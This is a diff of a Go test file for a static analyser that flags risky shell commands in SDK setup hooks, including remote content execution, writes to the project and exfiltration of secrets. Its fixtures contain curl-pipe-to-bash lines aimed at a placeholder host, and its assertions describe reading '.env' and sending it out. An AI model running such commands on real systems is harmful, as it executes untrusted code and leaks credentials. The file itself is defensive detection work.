@@ -22,10 +22,50 @@ func TestRemoteContentExecutionRequiresAFlowToShell(t *testing.T) {
 	if remote.Confidence != "high" || len(remote.Evidence) != 2 || remote.Evidence[1].FromOperationID == "" || remote.Evidence[1].ToOperationID == "" {
 		t.Fatalf("remote finding = %#v", remote)
 	}
+	if remote.Evidence[0].Derivation != finding.EvidenceInferred || remote.Evidence[1].Derivation != finding.EvidenceInferred ||
+		len(remote.Evidence[1].Relations) != 1 || remote.Evidence[1].Relations[0].Kind != analysis.RelationPipeline {
+		t.Fatalf("remote provenance = %#v", remote.Evidence)
+	}
 
 	nearMiss := analyzedSDK(t, "curl -o /tmp/install https://example.invalid/install\n", sdk.HookSetupBase)
 	if got := findFinding(finding.AnalyzeSDK(nearMiss), "risk.remote-content-execution"); got != nil {
 		t.Fatalf("near-miss finding = %#v", got)
+	}
+}
+
+func TestEvidenceSeparatesInferredBehaviorFromUnresolvedArguments(t *testing.T) {
+	t.Parallel()
+
+	item := analyzedSDK(t, "DEST=/project/generated/tool\ncurl \"$URL\" -o \"$DEST\"\n", sdk.HookSetupProject)
+	got := findFinding(finding.AnalyzeSDK(item), "risk.remote-content-to-project")
+	if got == nil {
+		t.Fatalf("findings = %#v", finding.AnalyzeSDK(item))
+	}
+	source := evidenceByID(got.Evidence, "network-download")
+	sink := evidenceByID(got.Evidence, "project-write")
+	unresolved := evidenceByID(got.Evidence, "unresolved-argument")
+	if source == nil || source.Derivation != finding.EvidenceInferred || source.Resolution != analysis.Resolved {
+		t.Fatalf("known behavior evidence = %#v", source)
+	}
+	if sink == nil || sink.Derivation != finding.EvidenceInferred || sink.NormalizedValue != "/project/generated/tool" {
+		t.Fatalf("known destination evidence = %#v", sink)
+	}
+	if unresolved == nil || unresolved.Derivation != finding.EvidenceUnresolved || unresolved.Expression != "$URL" || unresolved.Resolution != analysis.Unknown {
+		t.Fatalf("unresolved endpoint evidence = %#v; all = %#v", unresolved, got.Evidence)
+	}
+}
+
+func TestRemoteContentExecutionRespectsStaticReachability(t *testing.T) {
+	t.Parallel()
+
+	unreachable := analyzedSDK(t, "if false; then curl https://example.invalid/install | bash; fi\n", sdk.HookSetupBase)
+	if got := findFinding(finding.AnalyzeSDK(unreachable), "risk.remote-content-execution"); got != nil {
+		t.Fatalf("unreachable branch produced finding = %#v", got)
+	}
+
+	unknown := analyzedSDK(t, "if condition; then curl https://example.invalid/install | bash; fi\n", sdk.HookSetupBase)
+	if got := findFinding(finding.AnalyzeSDK(unknown), "risk.remote-content-execution"); got == nil {
+		t.Fatalf("unknown-reachability branch was dropped: %#v", finding.AnalyzeSDK(unknown))
 	}
 }
 
@@ -39,6 +79,21 @@ func TestCDIsKnownInRootHooks(t *testing.T) {
 	}
 	if got := findFinding(findings, "assurance.all-commands-known"); got == nil {
 		t.Fatalf("cd did not contribute to known-command assurance: %#v", findings)
+	}
+}
+
+func TestUnregisteredAndDynamicCommandsHaveDifferentEvidence(t *testing.T) {
+	t.Parallel()
+
+	unregistered := analyzedSDK(t, "latra-unknown-fixture\n", sdk.HookSetupBase)
+	got := findFinding(finding.AnalyzeSDK(unregistered), "risk.unknown-command-root")
+	if got == nil || len(got.Evidence) == 0 || got.Evidence[0].ID != "unregistered-command" || got.Evidence[0].Value != "latra-unknown-fixture" {
+		t.Fatalf("unregistered command finding = %#v", got)
+	}
+
+	dynamic := analyzedSDK(t, "$COMMAND argument\n", sdk.HookSetupBase)
+	if got := findFinding(finding.AnalyzeSDK(dynamic), "risk.unknown-command-root"); got != nil {
+		t.Fatalf("dynamic command received unregistered-command risk = %#v", got)
 	}
 }
 
@@ -350,11 +405,12 @@ func TestProjectSecretExfiltrationFlowVariants(t *testing.T) {
 			if got == nil {
 				t.Fatalf("findings = %#v", finding.AnalyzeSDK(item))
 			}
-			if got.Severity != "critical" || len(got.Evidence) != 2 {
+			if got.Severity != "critical" || len(got.Evidence) < 2 {
 				t.Fatalf("exfiltration finding = %#v", got)
 			}
-			if got.Evidence[0].ID != "project-sensitive-file-read" || got.Evidence[0].Value != ".env" ||
-				got.Evidence[1].ID != "external-send" || got.Evidence[1].FromOperationID == "" || got.Evidence[1].ToOperationID == "" {
+			source := evidenceByID(got.Evidence, "project-sensitive-file-read")
+			sink := evidenceByID(got.Evidence, "external-send")
+			if source == nil || source.Value != ".env" || sink == nil || sink.FromOperationID == "" || sink.ToOperationID == "" {
 				t.Errorf("flow evidence = %#v", got.Evidence)
 			}
 			if generic := findFinding(finding.AnalyzeSDK(item), "risk.project-data-exfiltration"); generic != nil {
@@ -445,10 +501,12 @@ func TestProjectDataExfiltrationFlowVariants(t *testing.T) {
 		t.Run(test.name, func(t *testing.T) {
 			item := analyzedSDK(t, test.content+"\n", sdk.HookSetupProject)
 			got := findFinding(finding.AnalyzeSDK(item), "risk.project-data-exfiltration")
-			if got == nil || got.Severity != "high" || got.Weight != 50 || len(got.Evidence) != 2 {
+			if got == nil || got.Severity != "high" || got.Weight != 50 || len(got.Evidence) < 2 {
 				t.Fatalf("project exfiltration = %#v; all = %#v", got, finding.AnalyzeSDK(item))
 			}
-			if got.Evidence[0].ID != "project-read" || got.Evidence[0].NormalizedValue != "/project/README.md" || got.Evidence[1].ID != "external-send" {
+			source := evidenceByID(got.Evidence, "project-read")
+			sink := evidenceByID(got.Evidence, "external-send")
+			if source == nil || source.NormalizedValue != "/project/README.md" || sink == nil {
 				t.Errorf("project exfiltration evidence = %#v", got.Evidence)
 			}
 		})
@@ -785,6 +843,15 @@ func findFinding(findings []finding.Finding, id string) *finding.Finding {
 	for index := range findings {
 		if findings[index].ID == id {
 			return &findings[index]
+		}
+	}
+	return nil
+}
+
+func evidenceByID(evidence []finding.Evidence, id string) *finding.Evidence {
+	for index := range evidence {
+		if evidence[index].ID == id {
+			return &evidence[index]
 		}
 	}
 	return nil
